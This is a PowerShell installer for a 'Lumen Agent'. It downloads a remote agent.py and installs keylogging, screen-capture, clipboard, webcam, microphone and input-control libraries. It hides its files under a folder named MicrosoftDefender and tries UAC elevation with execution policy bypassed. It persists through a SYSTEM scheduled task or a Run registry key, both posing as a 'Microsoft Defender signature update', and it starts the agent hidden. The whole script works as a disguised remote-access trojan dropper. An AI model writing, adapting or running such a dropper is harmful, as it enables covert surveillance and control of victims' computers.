# Lumen Agent Installer v2.0
# Installs a portable Python environment and sets up the agent for persistent execution.
# Features dual-mode installation (Admin or User) and robust dependency handling.

# --- CONFIGURATION ---
$TargetDirectory = "$env:LOCALAPPDATA\MicrosoftDefender"
$PythonVersion = "3.10.11"
$PythonUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-embed-amd64.zip"
$AgentUrl = "https://lumen.swirly.hackclub.app/agent.py" # Public URL to your agent.py

# --- Main Execution ---

# Check if the script is already running with a specific parameter to avoid loops
if ($MyInvocation.MyCommand.Definition -match 'IsElevatedAttempt') {
    # This instance was started by the non-admin part. It will either have admin rights or not.
} else {
    # This is the initial run.
    try {
        # Check current privileges
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal $identity
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            # Not admin. Try to elevate.
            Write-Host "Administrator privileges are recommended for full persistence." -ForegroundColor Yellow
            Write-Host "Attempting to re-launch with elevated privileges..."
            Write-Host "If you click 'No' on the UAC prompt, a limited user-level installation will be performed."
            
            $params = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -IsElevatedAttempt"
            # The -Wait switch is crucial. The script pauses here until the elevated process finishes or fails.
            Start-Process powershell.exe -Verb RunAs -ArgumentList $params -Wait
            # After the elevated process is done, the original non-admin script should exit.
            exit
        }
    } catch {
        # This block catches the error if the user clicks "No" on the UAC prompt.
        Write-Host "UAC elevation denied. Proceeding with user-level installation." -ForegroundColor Yellow
    }
}

# --- Installation Logic (will run in either Admin or User context) ---

try {
    # Check privileges again to determine installation path
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal $identity
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin) {
        Write-Host "Running with Administrator privileges. Performing system-wide installation." -ForegroundColor Green
    } else {
        Write-Host "Running with User privileges. Performing local installation." -ForegroundColor Cyan
    }

    # 1. Create the target directory
    Write-Host "Setting up installation directory: $TargetDirectory"
    New-Item -Path $TargetDirectory -ItemType Directory -Force | Out-Null
    $PythonExePath = Join-Path $TargetDirectory "python.exe"
    $PipExePath = Join-Path $TargetDirectory "Scripts\pip.exe"
    $AgentScriptPath = Join-Path $TargetDirectory "agent.py"

    # 2. Download and Extract Portable Python
    if (-not (Test-Path $PythonExePath)) {
        Write-Host "Downloading Portable Python..."
        $PythonZipPath = Join-Path $env:TEMP "python-embed.zip"
        Invoke-WebRequest -Uri $PythonUrl -OutFile $PythonZipPath
        Write-Host "Extracting Python..."
        Expand-Archive -Path $PythonZipPath -DestinationPath $TargetDirectory -Force
        Remove-Item $PythonZipPath
    } else { Write-Host "Portable Python already present." }

    # 3. Enable and Install Pip
    if (-not (Test-Path $PipExePath)) {
        Write-Host "Installing pip..."
        $pthFile = Join-Path $TargetDirectory "python310._pth"
        (Get-Content $pthFile).Replace("#import site", "import site") | Set-Content $pthFile
        $GetPipPath = Join-Path $env:TEMP "get-pip.py"
        Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $GetPipPath
        & $PythonExePath $GetPipPath; Remove-Item $GetPipPath
    } else { Write-Host "Pip already present." }

    # 4. Download Agent and Install Dependencies
    Write-Host "Downloading Lumen Agent script..."
    Invoke-WebRequest -Uri $AgentUrl -OutFile $AgentScriptPath

    # Define dependencies with specific wheels for tricky packages
    $dependencies = @(
        @{ Name = 'PyAudio'; WheelUrl = 'https://download.lfd.uci.edu/pythonlibs/archived/PyAudio-0.2.14-cp310-cp310-win_amd64.whl' },
        @{ Name = 'websockets' },
        @{ Name = 'requests' },
        @{ Name = 'psutil' },
        @{ Name = 'opencv-python-headless' },
        @{ Name = 'mss' },
        @{ Name = 'pygetwindow' },
        @{ Name = 'pyperclip' },
        @{ Name = 'pynput' },
        @{ Name = 'pyautogui' },
        @{ Name = 'numpy' }
    )

    Write-Host "Installing agent dependencies..."
    foreach ($pkg in $dependencies) {
        $pkgName = $pkg.Name
        $wheelUrl = $pkg.WheelUrl
        $success = $false
        
        if ($wheelUrl) {
            Write-Host "  - Attempting to install $pkgName from pre-compiled wheel..."
            try {
                $wheelPath = Join-Path $env:TEMP "$($pkgName).whl"
                Invoke-WebRequest -Uri $wheelUrl -OutFile $wheelPath
                & $PipExePath install $wheelPath --quiet
                Remove-Item $wheelPath
                $success = $true
                Write-Host "    ... Success (Wheel)" -ForegroundColor Green
            } catch {
                Write-Host "    ... Wheel installation failed. Falling back to pip." -ForegroundColor Yellow
            }
        }
        
        if (-not $success) {
            Write-Host "  - Installing $pkgName using pip..."
            try {
                & $PipExePath install $pkgName --quiet
                Write-Host "    ... Success (Pip)" -ForegroundColor Green
            } catch {
                Write-Host "    ... FAILED to install $pkgName with pip." -ForegroundColor Red
            }
        }
    }

    # 5. Create Persistence
    if ($isAdmin) {
        Write-Host "Creating persistent scheduled task (Admin mode)..."
        $TaskName = "MicrosoftDefenderUpdate"
        $Action = New-ScheduledTaskAction -Execute "$TargetDirectory\pythonw.exe" -Argument "$AgentScriptPath"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 999)
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Microsoft Defender signature update task." -Force
        Write-Host "Scheduled task '$TaskName' created successfully." -ForegroundColor Green
    } else {
        Write-Host "Creating persistence in user registry (User mode)..."
        $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $ValueName = "MicrosoftDefenderUpdate"
        $Command = "`"$TargetDirectory\pythonw.exe`" `"$AgentScriptPath`""
        Set-ItemProperty -Path $RegistryPath -Name $ValueName -Value $Command -Force
        Write-Host "Registry key created successfully." -ForegroundColor Green
    }

    # 6. Start the Agent for the First Time (Hidden)
    Write-Host "Performing initial agent launch (hidden)..."
    Start-Process -FilePath "$TargetDirectory\pythonw.exe" -ArgumentList "$AgentScriptPath" -WindowStyle Hidden

    Write-Host ""
    Write-Host "--- Installation Complete ---" -ForegroundColor Cyan
    Write-Host "The Lumen Agent is now running and will persist."

} catch {
    Write-Error "A critical error occurred during installation: $_"
    Read-Host "Press Enter to exit."
}
